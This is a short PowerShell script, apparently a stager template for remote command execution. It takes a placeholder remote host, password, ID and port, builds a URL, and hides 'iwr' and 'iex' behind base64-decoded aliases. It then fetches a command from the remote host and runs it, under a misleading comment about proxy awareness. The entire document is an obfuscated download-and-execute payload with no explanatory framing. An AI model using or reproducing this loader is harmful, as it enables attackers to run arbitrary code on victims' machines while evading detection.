$rh = "<REMOTEHOST>"
$pwd = "<PASSWORD>"
$id = "<ID>"
$port = "<PORT>"

$url = "http://$rh`:$port/id/$id"

# add proxy awareness 
Set-Alias -Name "mwr" -Value $([System.Text.Encoding]::utf8.GetString([System.Convert]::FromBase64String("aXdy")));
Set-Alias -Name "rcn" -Value $([System.Text.Encoding]::utf8.GetString([System.Convert]::FromBase64String("aWV4")));

$headers = @{'Authorization' = $pwd};
$cmd=$(mwr -Uri $url -Headers $headers).Content
rcn $cmd
